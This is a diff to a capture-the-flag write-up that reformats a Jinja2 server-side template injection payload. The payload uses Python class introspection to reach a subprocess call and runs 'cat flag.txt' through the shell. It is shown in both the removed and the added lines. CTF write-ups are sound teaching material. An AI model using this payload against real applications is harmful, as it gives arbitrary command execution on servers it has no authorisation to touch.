@@ -26,7 +26,11 @@ from PicoCTF 2018.
 
 We follow this method, and find the injection that gives us our flag:
 
-    {{ ''.__class__.__mro__[2].__subclasses__()[258]('cat flag.txt',shell=True,stdout=-1).communicate() }}"
+{% raw %}
+```
+{{ ''.__class__.__mro__[2].__subclasses__()[258]('cat flag.txt',shell=True,stdout=-1).communicate() }}"
+```
+{% endraw %}
 
 ![](writeupfiles/dec9_solution.png)
 
